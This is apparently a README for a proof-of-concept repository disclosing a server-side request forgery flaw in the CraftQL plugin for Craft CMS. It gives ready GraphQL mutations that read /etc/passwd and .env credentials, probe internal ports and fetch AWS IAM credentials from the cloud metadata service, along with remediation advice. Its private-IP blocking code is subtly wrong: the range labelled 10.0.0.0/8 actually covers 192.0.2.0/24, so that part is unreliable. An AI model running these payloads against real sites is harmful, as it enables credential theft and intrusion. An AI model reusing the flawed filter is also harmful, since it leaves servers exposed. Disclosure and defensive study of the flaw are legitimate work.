# CraftQL SSRF Vulnerability

> 🎯 **Affected Versions**: Craft CMS 3.x + CraftQL <= 1.3.7
>

## 📌 Executive Summary

CraftQL is a popular GraphQL plugin for Craft CMS. A **Server-Side Request Forgery (SSRF)** vulnerability exists when handling Asset field remote URLs through GraphQL mutations. Attackers can exploit this to:

- ✅ Read server local files (e.g., `/etc/passwd`, `.env` configs)
- ✅ Scan internal network ports and services
- ✅ Steal cloud service metadata (AWS/GCP/Azure IAM credentials)
- ✅ Access sensitive internal network resources

## 🎯 Vulnerability Information

| Item | Details |
|------|---------|
| **Vulnerability Type** | Server-Side Request Forgery (SSRF) |
| **Affected Component** | CraftQL Plugin - GetAssetsFieldSchema.php |
| **Vulnerable File** | `vendor/markhuot/craftql/src/Listeners/GetAssetsFieldSchema.php:56` |
| **Attack Vector** | Network |
| **Complexity** | Low |
| **Privileges Required** | None (GraphQL Token only) |

## ⚡ Quick Start

### Requirements

- Python 3.6+ or Bash
- Craft CMS 3.x + CraftQL <= 1.3.7 installed
- Valid GraphQL Token

### Run POC

#### Python Version (Recommended)

```bash
cd poc
python3 ssrf_poc.py
```

#### Bash Version

```bash
cd poc
bash ssrf_poc.sh
```

## 📖 Vulnerability Details

### Root Cause

CraftQL directly uses `file_get_contents()` to fetch user-provided remote URLs in Asset field GraphQL mutations **without any validation**:

```php
// File: vendor/markhuot/craftql/src/Listeners/GetAssetsFieldSchema.php
// Lines: 42-70

$remoteUrl = $value['url'];  // ⚠️ User input, no validation
$parts = parse_url($remoteUrl);
$filename = basename($parts['path']);

$uploadPath = \craft\helpers\Assets::tempFilePath();

// 🔴 SSRF Vulnerability: file_get_contents() supports multiple protocols
file_put_contents($uploadPath, file_get_contents($remoteUrl));
```

### Dangerous Protocols Supported

PHP's `file_get_contents()` function supports multiple URL wrappers that attackers can exploit:

| Protocol | Wrapper | Attack Type | Example |
|----------|---------|-------------|---------|
| `file://` | file | Local File Inclusion | `file:///etc/passwd` |
| `http://` | http | Internal Network Scan | `http://192.168.1.1/` |
| `https://` | https | Internal Service Access | `https://admin.internal/` |
| `gopher://` | gopher | Raw TCP Data | `gopher://localhost:6379/` |
| `dict://` | dict | Dictionary Protocol | `dict://localhost:11211/` |

## 🎬 Attack Demonstrations

### POC #1: Read /etc/passwd

```graphql
mutation {
  upsertTestDefault(
    title: "SSRF Test"
    heroImage: {url: "file:///etc/passwd"}
  ) {
    id
  }
}
```

**Result**:
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

### POC #2: Read Database Credentials

```graphql
mutation {
  upsertTestDefault(
    title: "Config Leak"
    heroImage: {url: "file:///var/www/html/.env"}
  ) {
    id
  }
}
```

**Result**:
```
DB_DATABASE=craftcms
DB_USER=craftuser
DB_PASSWORD=SecretPassword123
```

### POC #3: Internal Port Scan

```graphql
mutation {
  upsertTestDefault(
    title: "Port Scan"
    heroImage: {url: "http://192.168.1.1:22/"}
  ) {
    id
  }
}
```

**Result**: If port is open, request times out (response time > 5s)

### POC #4: Cloud Metadata Theft (AWS)

```graphql
mutation {
  upsertTestDefault(
    title: "Cloud Metadata"
    heroImage: {url: "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
  ) {
    id
  }
}
```

**Result**: Returns AWS IAM credentials

## 🛡️ Remediation

### Solution 1: URL Protocol Whitelist (Recommended)

```php
$parsedUrl = parse_url($remoteUrl);
$allowedSchemes = ['http', 'https'];

if (!isset($parsedUrl['scheme']) || !in_array($parsedUrl['scheme'], $allowedSchemes)) {
    throw new \InvalidArgumentException('Only HTTP/HTTPS URLs are allowed');
}
```

### Solution 2: Domain Whitelist

```php
$allowedHosts = ['cdn.example.com', 'assets.example.com'];

if (!in_array($parsedUrl['host'], $allowedHosts)) {
    throw new \InvalidArgumentException('Domain not in whitelist');
}
```

### Solution 3: Block Private IPs

```php
$host = gethostbyname($parsedUrl['host']);
$ip = ip2long($host);

if ($this->isPrivateIP($ip)) {
    throw new \InvalidArgumentException('Private IP addresses not allowed');
}

private function isPrivateIP($ip) {
    return (
        ($ip >= 3232235521 && $ip <= 3232301055) ||  // 192.168.0.0/16
        ($ip >= 2886729728 && $ip <= 2887778303) ||  // 172.16.0.0/12
        ($ip >= 3221225984 && $ip <= 3221226239)    // 10.0.0.0/8
    );
}
```

### Solution 4: Use Guzzle HTTP Client

```php
$client = \Craft::$app->getGuzzle();
try {
    $response = $client->get($remoteUrl, [
        'timeout' => 10,
        'connect_timeout' => 5,
        'allow_redirects' => false,
        'stream' => true
    ]);
    $content = $response->getBody()->getContents();
} catch (\Exception $e) {
    throw new \InvalidArgumentException('Failed to fetch URL');
}

file_put_contents($uploadPath, $content);
```

### Temporary Mitigations

1. **Disable CraftQL Plugin** (if GraphQL not needed)
2. **Restrict GraphQL API Access** (trusted IPs only)
3. **Revoke All GraphQL Tokens** (regenerate with strict permissions)
4. **Network Isolation** (monitor outbound traffic)

## 📊 Impact Assessment

### Attack Scenarios

1. **Data Leakage**
   - Read config files (database credentials, API keys)
   - Read source code
   - Read log files

2. **Internal Network Penetration**
   - Port scanning (identify internal services)
   - Service enumeration (Redis, MySQL, SSH, etc.)
   - Exploit internal services

3. **Cloud Service Attacks**
   - AWS: `http://169.254.169.254/latest/meta-data/`
   - GCP: `http://metadata.google.internal/computeMetadata/v1/`
   - Azure: `http://169.254.169.254/metadata/identity`

4. **Supply Chain Attacks**
   - Access internal APIs
   - Steal internal service credentials
   - Lateral movement

## 🔍 Detection Methods

### 1. Check Vulnerable Code

```bash
grep -n "file_get_contents(\\\$remoteUrl)" \
  vendor/markhuot/craftql/src/Listeners/GetAssetsFieldSchema.php
```

**If this code exists, the vulnerability is present**

### 2. Check Plugin Version

```bash
cat composer.lock | grep -A 5 '"name": "markhuot/craftql"'
```

**Version <= 1.3.7 is affected**

### 3. Check GraphQL Logs

```bash
tail -f storage/logs/*.log | grep "file_get_contents"
```

## 📚 Documentation

- [Detailed Vulnerability Analysis](docs/VULNERABILITY_ANALYSIS.md)
- [Reproduction Guide](docs/VULNERABILITY_REPRODUCTION.md)
- [Quick Start Guide](QUICKSTART.md)
- [Code of Conduct](CODE_OF_CONDUCT.md)

## 🤝 Responsible Disclosure

This vulnerability is disclosed following responsible disclosure principles:

1. ✅ Attempted contact with CraftQL author (markhuot)
2. ✅ Given vendor reasonable time to fix
3. ✅ Intended for educational and defensive purposes only
4. ✅ Unauthorized use against systems is prohibited

## ⚖️ Legal Disclaimer

This tool and POC are intended for:
- ✅ Authorized security testing
- ✅ Educational research
- ✅ Vulnerability remediation verification
- ✅ Defensive security assessments

**Unauthorized access to computer systems is illegal. Ensure you have explicit authorization before using this POC.**

## 📞 Contact

- **Discovery**: Security Researcher
- **Disclosure Date**: 2026-02-06
- **Project Status**: Unpatched (as of disclosure date)

## 🙏 Acknowledgments

Thanks to the Craft CMS and CraftQL community for their contributions.

---

**⚠️ WARNING**: This vulnerability exploit code is for authorized security testing and educational purposes only. Users assume all legal liability for their actions.

## 🌟 Star History

If you find this research useful, please consider giving it a star!

⭐ Star us on GitHub — it helps!